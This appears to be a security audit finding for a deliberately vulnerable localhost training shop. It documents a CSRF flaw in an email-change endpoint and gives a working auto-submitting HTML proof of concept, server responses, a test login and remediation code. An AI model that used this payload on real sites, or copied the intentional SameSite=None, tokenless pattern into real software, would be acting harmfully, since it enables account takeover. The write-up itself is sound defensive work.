# F03 — CSRF (Email Change Without Token)

| | |
|---|---|
| **ID** | F03 |
| **Severity** | Medium |
| **OWASP** | A01:2021 — Broken Access Control |
| **Location** | `POST /api/profile/email` — no CSRF token, no Origin/Referer check; session cookie `SameSite=None` (D3) |
| **Status** | Verified (automated + manual) |

## Description

The email-change endpoint accepts a plain form POST and relies on the session cookie
for auth. The cookie is set with `SameSite=None; Secure`, so the browser sends it
with **cross-site** requests. There is no CSRF token and no Origin validation, so an
attacker page can silently change the victim's email.

## How to reproduce

1. Log in as `alice@fashionhub.dev` / `alice123` at `http://localhost:5173`.
2. While still logged in, visit the attacker page `http://localhost:4444/csrf-poc.html`
   (served from a *different origin*, port 4444):

```html
<!-- poc/csrf-poc.html -->
<form method="POST" action="http://localhost:3000/api/profile/email">
  <input type="hidden" name="newEmail" value="hacked@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

3. The form auto-submits cross-site. The browser attaches the victim's
   `session=2` cookie (`SameSite=None` allows this) and the server processes it:

```
POST /api/profile/email  → 200
GET  /api/profile        → {"id":2,"email":"hacked@evil.com","role":"customer"}
```

Evidence: `screenshots/03a-csrf-poc-html.png`, `screenshots/03b-email-changed-profile.png`

## Impact

Attacker changes the victim's account email without their knowledge, then uses
"forgot password" on the new email to take over the account. Same pattern applies
to any state-changing endpoint (this app's other POST endpoints are review
creation — spam/defacement vector).

## Remediation

```ts
// BEFORE (vulnerable) — cookie SameSite=None, no token, no Origin check
router.post('/profile/email', requireAuth, async (req, res) => { ... });

// AFTER — layered defenses
// 1. SameSite=Lax (blocks cross-site POSTs in modern browsers)
res.cookie('session', token, { sameSite: 'lax', httpOnly: true, secure: true });

// 2. CSRF token (synchronizer token pattern)
//    issue with session, require and verify on every state-changing POST
router.post('/profile/email', requireAuth, verifyCsrfToken, handler);

// 3. Origin/Referer allowlist as a secondary check
const allowed = ['http://localhost:5173'];
if (!allowed.includes(req.headers.origin)) return res.status(403).end();
```

Note (D3): `SameSite=None` was chosen deliberately so the CSRF demo works in modern
browsers, which default to `Lax`. The fix is the combination above.
